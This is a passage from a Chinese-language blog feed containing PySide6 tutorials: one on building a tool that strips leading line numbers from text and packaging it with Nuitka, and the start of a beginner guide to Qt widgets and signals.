<span class="token comment"># 创建布局并添加组件</span>        layout <span class="token operator">=</span> QGridLayout<span class="token punctuation">(</span><span class="token punctuation">)</span>        layout<span class="token punctuation">.</span>addWidget<span class="token punctuation">(</span>self<span class="token punctuation">.</span>label<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span>        layout<span class="token punctuation">.</span>addWidget<span class="token punctuation">(</span>self<span class="token punctuation">.</span>button_copy<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span>        layout<span class="token punctuation">.</span>addWidget<span class="token punctuation">(</span>self<span class="token punctuation">.</span>edit<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span>        layout<span class="token punctuation">.</span>addWidget<span class="token punctuation">(</span>self<span class="token punctuation">.</span>button<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span>        <span class="token comment"># 设置窗口图标</span>        icon <span class="token operator">=</span> QIcon<span class="token punctuation">(</span><span class="token string">"logo.ico"</span><span class="token punctuation">)</span>  <span class="token comment"># 替换为自己的图标路径</span>        self<span class="token punctuation">.</span>setWindowIcon<span class="token punctuation">(</span>icon<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>setWindowTitle<span class="token punctuation">(</span><span class="token string">"Wq's tool"</span><span class="token punctuation">)</span>        <span class="token comment"># 应用布局</span>        self<span class="token punctuation">.</span>setLayout<span class="token punctuation">(</span>layout<span class="token punctuation">)</span>        <span class="token comment"># 连接greetings槽和按钮单击信号</span>        self<span class="token punctuation">.</span>button<span class="token punctuation">.</span>clicked<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>self<span class="token punctuation">.</span>greetings<span class="token punctuation">)</span>    <span class="token comment"># 实现对输入文本的处理，由于是对话框的输出，保持原来的函数名字greetings()</span>    <span class="token keyword">def</span> <span class="token function">greetings</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment">#这里在给self.lines赋值是因为似乎之前定义之前没按钮没生效，之前定义应该赋空值，懒得改了，没什么错误那就保持原样吧。。。</span>        self<span class="token punctuation">.</span>lines <span class="token operator">=</span> <span class="token punctuation">[</span>_ <span class="token keyword">for</span> _ <span class="token keyword">in</span> self<span class="token punctuation">.</span>edit<span class="token punctuation">.</span>toPlainText<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">]</span>        <span class="token keyword">for</span> i<span class="token punctuation">,</span>line <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>lines<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token comment">#调用re.sub(正则表达式，替换后的字符，需要替换掉原味奶)</span>            self<span class="token punctuation">.</span>lines<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> re<span class="token punctuation">.</span>sub<span class="token punctuation">(</span><span class="token string">r'^\d+\s*'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> line<span class="token punctuation">)</span>        <span class="token comment">#这里再开一个窗口</span>        message_box <span class="token operator">=</span> QMessageBox<span class="token punctuation">(</span><span class="token punctuation">)</span>        message_box<span class="token punctuation">.</span>setWindowTitle<span class="token punctuation">(</span><span class="token string">"出た！"</span><span class="token punctuation">)</span>        <span class="token comment"># 这里还有几个默认的参数没放出来</span>        <span class="token comment"># message_box.setIcon(QMessageBox.Information) 默认提示框图标为信息</span>        <span class="token comment"># message_box.addButton(QMessageBox.Ok) 默认有一个ok键</span>        output_text <span class="token operator">=</span> <span class="token string">""</span>  <span class="token comment"># 初始化空字符串</span>        <span class="token keyword">for</span> line <span class="token keyword">in</span> self<span class="token punctuation">.</span>lines<span class="token punctuation">:</span>            output_text <span class="token operator">+=</span> line            output_text <span class="token operator">+=</span> <span class="token string">"\n"</span>        message_box<span class="token punctuation">.</span>setText<span class="token punctuation">(</span>output_text<span class="token punctuation">)</span>        message_box<span class="token punctuation">.</span>setFixedSize<span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">,</span> <span class="token number">300</span><span class="token punctuation">)</span>        message_box<span class="token punctuation">.</span>setTextInteractionFlags<span class="token punctuation">(</span>Qt<span class="token punctuation">.</span>TextSelectableByMouse <span class="token operator">|</span> Qt<span class="token punctuation">.</span>TextSelectableByKeyboard<span class="token punctuation">)</span><span class="token comment"># 设置消息框的文本格式为可选择和可复制</span>        message_box<span class="token punctuation">.</span><span class="token keyword">exec</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">copy_text</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>lines <span class="token operator">=</span> <span class="token punctuation">[</span>_ <span class="token keyword">for</span> _ <span class="token keyword">in</span> self<span class="token punctuation">.</span>edit<span class="token punctuation">.</span>toPlainText<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">]</span>        <span class="token keyword">for</span> i<span class="token punctuation">,</span> line <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>lines<span class="token punctuation">)</span><span class="token punctuation">:</span>            self<span class="token punctuation">.</span>lines<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> re<span class="token punctuation">.</span>sub<span class="token punctuation">(</span><span class="token string">r'^\d+\s*'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> line<span class="token punctuation">)</span>        clipboard <span class="token operator">=</span> QGuiApplication<span class="token punctuation">.</span>clipboard<span class="token punctuation">(</span><span class="token punctuation">)</span>        output_text <span class="token operator">=</span> <span class="token string">""</span>  <span class="token comment"># 初始化空字符串</span>        <span class="token keyword">for</span> line <span class="token keyword">in</span> self<span class="token punctuation">.</span>lines<span class="token punctuation">:</span>            output_text <span class="token operator">+=</span> line            output_text <span class="token operator">+=</span> <span class="token string">"\n"</span>        clipboard<span class="token punctuation">.</span>setText<span class="token punctuation">(</span>output_text<span class="token punctuation">)</span>  <span class="token comment"># 将输出文本设置到剪贴板</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    <span class="token comment"># 创建Qt应用程序</span>    app <span class="token operator">=</span> QApplication<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span>    <span class="token comment"># 创建并显示Form</span>    form <span class="token operator">=</span> Form<span class="token punctuation">(</span><span class="token punctuation">)</span>    form<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment"># 运行Qt主循环</span>    sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span>app<span class="token punctuation">.</span>exec_<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="效果截图"><a href="#效果截图" class="headerlink" title="效果截图"></a>效果截图</h3><p><img src="/2023/10/19/pyside6-shi-jian-1/image-20231019215938556.png" alt="image-20231019215938556"></p><p><img src="/2023/10/19/pyside6-shi-jian-1/image-20231019220033073.png" alt="image-20231019220033073"></p><p>一键复制功能就不展示了，按下按钮即可复制。</p><p>虽然对我来说很艰巨，但是放在github上面还是显得和大佬格格不入，自己记录一下就好了。</p><p>捋一下思路</p><p>先创建Qt应用程序</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">app <span class="token operator">=</span> QApplication<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>创建并显示Form(创建对话框窗口。QDialog)</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">form <span class="token operator">=</span> Form<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Form</span><span class="token punctuation">(</span>QDialog<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment">#表示创建的是QDialog的子类</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> parent<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token builtin">super</span><span class="token punctuation">(</span>Form<span class="token punctuation">,</span> self<span class="token punctuation">)</span><span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>parent<span class="token punctuation">)</span> <span class="token comment">#parent指定对话框的父窗口,None即无父窗口</span>        self<span class="token punctuation">.</span>label <span class="token operator">=</span> QLabel<span class="token punctuation">(</span><span class="token string">"请输入文本，将帮您实现去除每行文本开头数字序号和空格："</span><span class="token punctuation">)</span>        <span class="token comment"># 创建组件</span>        self<span class="token punctuation">.</span>edit <span class="token operator">=</span> CustomPlainTextEdit<span class="token punctuation">(</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>edit<span class="token punctuation">.</span>setFixedWidth<span class="token punctuation">(</span><span class="token number">450</span><span class="token punctuation">)</span>  <span class="token comment"># 设置宽度为200像素</span>        self<span class="token punctuation">.</span>edit<span class="token punctuation">.</span>setFixedHeight<span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">)</span>  <span class="token comment"># 设置高度为30像素</span>        <span class="token comment">#原本使用的是self.edit = QLineEdit(),故需要设置顶部对齐，但好像按enter不能换行</span>        <span class="token comment">#self.edit.setAlignment(Qt.AlignTop)  # 将文本对齐方式设置为顶部对齐</span>        <span class="token comment">#设置输入框里内容为self.line并且split("\n")</span>        self<span class="token punctuation">.</span>lines <span class="token operator">=</span> <span class="token punctuation">[</span>_ <span class="token keyword">for</span> _ <span class="token keyword">in</span> self<span class="token punctuation">.</span>edit<span class="token punctuation">.</span>toPlainText<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">]</span>        <span class="token comment">#set functional button</span>        self<span class="token punctuation">.</span>button <span class="token operator">=</span> QPushButton<span class="token punctuation">(</span><span class="token string">"Run"</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>button_copy <span class="token operator">=</span> QPushButton<span class="token punctuation">(</span><span class="token string">"一键复制结果"</span><span class="token punctuation">)</span>        <span class="token comment">#将复制键和self.copy_text函数关联起来</span>        self<span class="token punctuation">.</span>button_copy<span class="token punctuation">.</span>clicked<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>self<span class="token punctuation">.</span>copy_text<span class="token punctuation">)</span>        <span class="token comment"># 创建布局并添加组件</span>        <span class="token comment"># 这里我原本使用的是QVBoxlayout即垂直分布，另还有QHBoxlayout</span>        layout <span class="token operator">=</span> QGridLayout<span class="token punctuation">(</span><span class="token punctuation">)</span>        layout<span class="token punctuation">.</span>addWidget<span class="token punctuation">(</span>self<span class="token punctuation">.</span>label<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span>        layout<span class="token punctuation">.</span>addWidget<span class="token punctuation">(</span>self<span class="token punctuation">.</span>button_copy<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span>        layout<span class="token punctuation">.</span>addWidget<span class="token punctuation">(</span>self<span class="token punctuation">.</span>edit<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span>        layout<span class="token punctuation">.</span>addWidget<span class="token punctuation">(</span>self<span class="token punctuation">.</span>button<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span>        <span class="token comment"># 设置窗口图标</span>        icon <span class="token operator">=</span> QIcon<span class="token punctuation">(</span><span class="token string">"logo.ico"</span><span class="token punctuation">)</span>  <span class="token comment"># 替换为自己的图标路径</span>        self<span class="token punctuation">.</span>setWindowIcon<span class="token punctuation">(</span>icon<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>setWindowTitle<span class="token punctuation">(</span><span class="token string">"Wq's tool"</span><span class="token punctuation">)</span>        <span class="token comment"># 应用布局</span>        self<span class="token punctuation">.</span>setLayout<span class="token punctuation">(</span>layout<span class="token punctuation">)</span>        <span class="token comment"># self.button连接greetings槽和按钮单击信号</span>        self<span class="token punctuation">.</span>button<span class="token punctuation">.</span>clicked<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>self<span class="token punctuation">.</span>greetings<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>class Form(QDialog): </p><ul><li><p>即<code>Form</code> 类继承自 <code>QDialog</code> 类，意味着 <code>Form</code> 类将继承 <code>QDialog</code> 类的属性和方法，并且可以在此基础上添加自己的特定行为和属性。</p></li><li><p><code>QDialog</code> 是Qt框架中提供的一个类，用于创建对话框窗口。对话框是一种常见的用户界面组件，用于与用户进行交互，接受输入或显示信息。</p></li><li><p>将 <code>Form</code> 类定义为 <code>QDialog</code> 的子类，你可以扩展 <code>QDialog</code> 类提供的功能，以满足特定的需求。可以添加自定义的布局、控件和逻辑，以及重写和扩展 <code>QDialog</code> 类中的方法来实现定制化的对话框窗口。</p></li></ul><p>补充：在Python中，<code>super()</code> 函数是用于调用父类（超类）的方法。它的作用是获取当前类的父类，并调用父类的方法。<code>super(Form, self).__init__(parent)</code> 的作用是调用 <code>Form</code> 类的父类 <code>QDialog</code> 的 <code>__init__</code> 方法，并传递 <code>parent</code> 参数给它。Python中，如果一个类继承自另一个类，那么在子类中重写父类的方法时，可以使用 <code>super()</code> 来调用父类的同名方法并扩展其功能。在Python 3及以上的版本中，可以使用简化的语法 <code>super().__init__(parent)</code> 来调用父类的方法，而不需要显式地指定类名和实例对象。但在旧版本的Python中，仍然需要使用 <code>super(Form, self).__init__(parent)</code> 的形式来调用父类的方法。</p><p><code>QGridLayout</code> 是一种布局管理器，用于将窗口或小部件按照网格的形式进行排列。</p><p>常用的布局管理器：</p><ol><li>QVBoxLayout：垂直布局管理器，将小部件垂直排列。</li><li>QHBoxLayout：水平布局管理器，将小部件水平排列。</li><li>QFormLayout：表单布局管理器，用于创建标签和输入字段的组合。</li><li>QStackedLayout：堆叠布局管理器，用于在同一区域显示多个小部件，但一次只显示一个小部件。</li><li>QBoxLayout：通用的盒式布局管理器，可以将小部件水平或垂直排列。</li><li>QGridLayout：网格布局管理器，以网格形式将小部件排列。</li><li>QSizePolicy：调整小部件大小策略的类，可与其他布局管理器一起使用。</li></ol><p>这些布局管理器可以根据您的需求进行嵌套和组合使用，以创建复杂的界面布局。您可以根据小部件的类型和排列需求选择适当的布局管理器来实现所需的布局效果。</p><p>然后实现与Run键相关联的函数/槽</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">greetings</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment">#这里在给self.lines赋值是因为似乎之前定义之前没按钮没生效，之前定义应该赋空值，懒得改了，没什么错误那就保持原样吧。。。</span>        self<span class="token punctuation">.</span>lines <span class="token operator">=</span> <span class="token punctuation">[</span>_ <span class="token keyword">for</span> _ <span class="token keyword">in</span> self<span class="token punctuation">.</span>edit<span class="token punctuation">.</span>toPlainText<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">]</span>        <span class="token keyword">for</span> i<span class="token punctuation">,</span>line <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>lines<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token comment">#调用re.sub(正则表达式，替换后的字符，需要替换掉原味奶)</span>            self<span class="token punctuation">.</span>lines<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> re<span class="token punctuation">.</span>sub<span class="token punctuation">(</span><span class="token string">r'^\d+\s*'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> line<span class="token punctuation">)</span>        <span class="token comment">#这里再开一个窗口</span>        message_box <span class="token operator">=</span> QMessageBox<span class="token punctuation">(</span><span class="token punctuation">)</span>        message_box<span class="token punctuation">.</span>setWindowTitle<span class="token punctuation">(</span><span class="token string">"出た！"</span><span class="token punctuation">)</span>        <span class="token comment"># 这里还有几个默认的参数没放出来</span>        <span class="token comment"># message_box.setIcon(QMessageBox.Information) 默认提示框图标为信息</span>        <span class="token comment"># message_box.addButton(QMessageBox.Ok) 默认有一个ok键</span>        output_text <span class="token operator">=</span> <span class="token string">""</span>  <span class="token comment"># 初始化空字符串</span>        <span class="token keyword">for</span> line <span class="token keyword">in</span> self<span class="token punctuation">.</span>lines<span class="token punctuation">:</span> <span class="token comment">#将要输出的信息循环赋值给output_text</span>            output_text <span class="token operator">+=</span> line            output_text <span class="token operator">+=</span> <span class="token string">"\n"</span>        message_box<span class="token punctuation">.</span>setText<span class="token punctuation">(</span>output_text<span class="token punctuation">)</span>        message_box<span class="token punctuation">.</span>setFixedSize<span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">,</span> <span class="token number">300</span><span class="token punctuation">)</span>        message_box<span class="token punctuation">.</span>setTextInteractionFlags<span class="token punctuation">(</span>Qt<span class="token punctuation">.</span>TextSelectableByMouse <span class="token operator">|</span> Qt<span class="token punctuation">.</span>TextSelectableByKeyboard<span class="token punctuation">)</span><span class="token comment"># 设置消息框的文本格式为可选择和可复制</span>        message_box<span class="token punctuation">.</span><span class="token keyword">exec</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>实现与“一键复制”关联的函数/槽</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">copy_text</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>lines <span class="token operator">=</span> <span class="token punctuation">[</span>_ <span class="token keyword">for</span> _ <span class="token keyword">in</span> self<span class="token punctuation">.</span>edit<span class="token punctuation">.</span>toPlainText<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">]</span>        <span class="token keyword">for</span> i<span class="token punctuation">,</span> line <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>lines<span class="token punctuation">)</span><span class="token punctuation">:</span>            self<span class="token punctuation">.</span>lines<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> re<span class="token punctuation">.</span>sub<span class="token punctuation">(</span><span class="token string">r'^\d+\s*'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> line<span class="token punctuation">)</span>        clipboard <span class="token operator">=</span> QGuiApplication<span class="token punctuation">.</span>clipboard<span class="token punctuation">(</span><span class="token punctuation">)</span>        output_text <span class="token operator">=</span> <span class="token string">""</span>  <span class="token comment"># 初始化空字符串</span>        <span class="token keyword">for</span> line <span class="token keyword">in</span> self<span class="token punctuation">.</span>lines<span class="token punctuation">:</span>            output_text <span class="token operator">+=</span> line            output_text <span class="token operator">+=</span> <span class="token string">"\n"</span>        clipboard<span class="token punctuation">.</span>setText<span class="token punctuation">(</span>output_text<span class="token punctuation">)</span>  <span class="token comment"># 将输出文本设置到剪贴板</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>clipboard = QGuiApplication.clipboard()</p><p>clipboard.setText(output_text)  # 将输出文本设置到剪贴板</p><p>这是实现将文本复制到clipboard的核心代码</p><p>下面这个是自定义的 <code>QPlainTextEdit</code> 类，重写了 <code>keyPressEvent()</code> 方法以处理按键事件。在这个自定义类中，当用户按下回车键（Enter 键或 Return 键）时，会将光标移动到文本的末尾，并在末尾插入一个换行符。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">CustomPlainTextEdit</span><span class="token punctuation">(</span>QPlainTextEdit<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">keyPressEvent</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> event<span class="token punctuation">:</span> QKeyEvent<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> event<span class="token punctuation">.</span>key<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token builtin">int</span><span class="token punctuation">(</span>Qt<span class="token punctuation">.</span>Key_Return<span class="token punctuation">)</span> <span class="token keyword">or</span> event<span class="token punctuation">.</span>key<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token builtin">int</span><span class="token punctuation">(</span>Qt<span class="token punctuation">.</span>Key_Enter<span class="token punctuation">)</span><span class="token punctuation">:</span>            self<span class="token punctuation">.</span>moveCursor<span class="token punctuation">(</span>QTextCursor<span class="token punctuation">.</span>End<span class="token punctuation">)</span><span class="token comment"># 将光标移动到文本末尾</span>            self<span class="token punctuation">.</span>insertPlainText<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span>            <span class="token keyword">return</span><span class="token comment"># 如果按下的不是回车键，则调用父类的 keyPressEvent() 方法处理其他按键事件</span>        <span class="token builtin">super</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>keyPressEvent<span class="token punctuation">(</span>event<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在这个自定义类中，我们重写了 <code>keyPressEvent()</code> 方法，并在方法体内对按键事件进行处理。如果按下的键是回车键（Enter 键或 Return 键），则会执行 <code>if</code> 语句块中的操作：将光标移动到文本的末尾，并在末尾插入一个换行符。然后，通过 <code>return</code> 语句提前结束方法的执行。</p><p>如果按下的键不是回车键，则会调用父类的 <code>keyPressEvent()</code> 方法，以便处理其他按键事件的默认行为。</p><h3 id="使用Nuitka"><a href="#使用Nuitka" class="headerlink" title="使用Nuitka"></a>使用Nuitka</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nuitka <span class="token parameter variable">--standalone</span> --show-memory --show-progress --windows-disable-console --nofollow-imports --plugin-enable<span class="token operator">=</span>pyside6 --follow-import-to<span class="token operator">=</span>utils,src --output-dir<span class="token operator">=</span>out --windows-icon-from-ico<span class="token operator">=</span>./logo.ico demo.py  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><p><code>--standalone</code>：方便移植到其他机器，不用再安装python</p></li><li><p><code>--show-memory --show-progress</code>：展示整个安装的进度过程</p></li><li><p><code>--windows-disable-console</code>：运行exe取消弹框。如果我们还需要调试，可能哪里还有问题之类的，就不用放上去了，但一般问题都在Pycharm解决了，就加上去</p></li><li><p><code>--nofollow-imports</code>：不编译代码中所有的import，比如keras，numpy之类的。</p></li><li><p><code>--plugin-enable=qt-plugins</code>：我这里用到pyside6来做界面的，这里nuitka有其对应的插件。还有pyqt之类的</p></li><li><p><code>--follow-import-to=utils,src</code>：需要编译成C++代码的指定的2个包含源码的文件夹，这里用<code>,</code>来进行分隔。</p></li><li><p><code>--output-dir=out</code>：指定输出的结果路径或者说输出文件夹名为out。</p></li><li><p><code>--windows-icon-from-ico=./logo.ico</code>：指定生成的exe的图标为logo.ico这个图标，这里使用的将图片转成ico格式文件的网站（<a href="https://www.bitbug.net/">比特虫</a>）。</p></li></ul><p>如果发现真正运行exe的时候，会报错：<code>no module named torch,cv2,tensorflow</code>等等这些没有转成C++的第三方包。</p><p>这里需要找到这些包复制（比如numpy,cv2这个文件夹）到<code>demo.dist</code>路径下。</p><p>至此，exe能完美运行啦！</p><p><a href="https://www.lixiaofei2yy.website/python%E7%9A%84%E6%89%93%E5%8C%85%E7%A5%9E%E5%99%A8nuitka">参考网站</a></p><p><a href="https://zhuanlan.zhihu.com/p/133303836">其它可参考网站</a></p><p>最后感谢免费的innosetup生成安装包 <a href="https://jrsoftware.org/isinfo.php">innosetup</a></p><h3 id="其它资源"><a href="#其它资源" class="headerlink" title="其它资源"></a>其它资源</h3><p><a href="https://www.pythonguis.com/">pyside6  pythonguis</a></p><p><a href="https://www.bilibili.com/video/BV1cJ411R7bP?p=1&amp;vd_source=6fb2d8618426a162edd6fcdb1c92b705">Designer写GUI</a></p>]]></content>
      
      
      <categories>
          
          <category> PySide6 </category>
          
          <category> Windows应用开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PySide6 </tag>
            
            <tag> Windows应用开发 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PySide6上手</title>
      <link href="/2023/10/19/pyside6-shang-shou/"/>
      <url>/2023/10/19/pyside6-shang-shou/</url>
      
        <content type="html"><![CDATA[<h1 id="创建第一个QtWidgets程序"><a href="#创建第一个QtWidgets程序" class="headerlink" title="创建第一个QtWidgets程序"></a>创建第一个QtWidgets程序</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> sys<span class="token keyword">from</span> PySide6<span class="token punctuation">.</span>QtWidgets <span class="token keyword">import</span> QApplication<span class="token punctuation">,</span> QLabelapp <span class="token operator">=</span> QApplication<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span>  <span class="token comment">#创建一个 QApplication 实例</span>label <span class="token operator">=</span> QLabel<span class="token punctuation">(</span><span class="token string">"Hello World!"</span><span class="token punctuation">)</span>label<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span>app<span class="token punctuation">.</span>exec_<span class="token punctuation">(</span><span class="token punctuation">)</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>要用 PySide6 创建一个窗口程序，你必须先从 <em>PySide6.QtWidgets</em> 模块中引用需要使用的类。  </p><p>引用后，创建一个 <em>QApplication</em> 实例。</p><p>因为 Qt 可以从命令行接收参数，你可以向 <em>QApplication</em> 对象传递任意参数。一般情况下我们不需要传递参数，或者也可以像下面这样写：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">app <span class="token operator">=</span> QApplication<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>创建完 <em>QApplication</em> 对象后，我们还创建了 <em>QLabel</em> 对象。<em>QLabel</em> 是一个可以显示文本和图像的容器。文本可以是简单文本，也可以是富文本，像HTML一样。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># This HTML approach will be valid too!</span>label <span class="token operator">=</span> QLabel<span class="token punctuation">(</span><span class="token string">"&lt;font color=red size=40&gt;Hello World!&lt;/font&gt;"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>注意</strong><br>在创建完一个标签后，我们要对它调用 <code>show()</code> 函数。</p><p>最后，我们调用 <code>app.exec_()</code> 进入主循环，开始执行代码。事实上，只有执行到了这，标签才被显示，但是现在我们可以先忽略这点。</p><h1 id="创建一个简单按钮"><a href="#创建一个简单按钮" class="headerlink" title="创建一个简单按钮"></a>创建一个简单按钮</h1><p>如何用 Qt for Python 处理信号和槽。<strong>信号和槽</strong>是Qt的一个特色，用来让你的图形组件与其他图形组件或 Python 代码交流。</p><p>首先，引用所需的 <em>PySide6</em> 类和 <em>sys</em> 模块：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> sys<span class="token keyword">from</span> PySide6<span class="token punctuation">.</span>QtWidgets <span class="token keyword">import</span> QApplication<span class="token punctuation">,</span> QPushButton<span class="token keyword">from</span> PySide6<span class="token punctuation">.</span>QtCore <span class="token keyword">import</span> Slot<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>然后创建一个函数，用来输出信息到控制台：</p><pre 